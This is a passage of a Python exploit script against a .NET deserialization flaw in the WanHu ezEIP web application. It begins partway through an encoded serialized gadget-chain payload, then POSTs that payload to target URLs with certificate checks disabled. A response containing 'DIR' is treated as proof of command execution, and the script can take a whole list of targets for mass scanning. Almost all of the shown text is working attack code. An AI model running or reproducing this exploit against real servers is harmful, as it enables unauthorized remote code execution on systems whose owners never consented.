yaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZyAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GcwAAAAtnZXRfQ3VycmVudAoBSwAAAEMAAAAJcwAAAAk%2BAAAACXIAAAAGdgAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpBncAAAAZU3lzdGVtLlR5cGUgZ2V0X0N1cnJlbnQoKQgAAAAKAUwAAABCAAAABngAAADGAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk%2BAAAACgk%2BAAAABnoAAAAQU3lzdGVtLkFjdGl2YXRvcgZ7AAAADkNyZWF0ZUluc3RhbmNlCgFNAAAAQwAAAAl7AAAACT4AAAAJegAAAAZ%2BAAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpBn8AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkIAAAACgFOAAAADwAAAAaAAAAAJlN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uQ29tbWFuZElEBAAAAAk6AAAAEE8AAAACAAAACYIAAAAICAAgAAAEggAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAAAAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL%2BwCgyQ8m9wsLfW3lPHcqhM8jewcv5VJIqA7wqWA%3D&__VIEWSTATEGENERATOR=60AF4756"""
        response = requests.post(target, headers=headers, verify=False,data=data)
        if response.status_code == 200 and 'DIR' in response.text:
            print(f"\033[31mDiscovered:{url}: WanHuezEIP_success_Deserialization!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")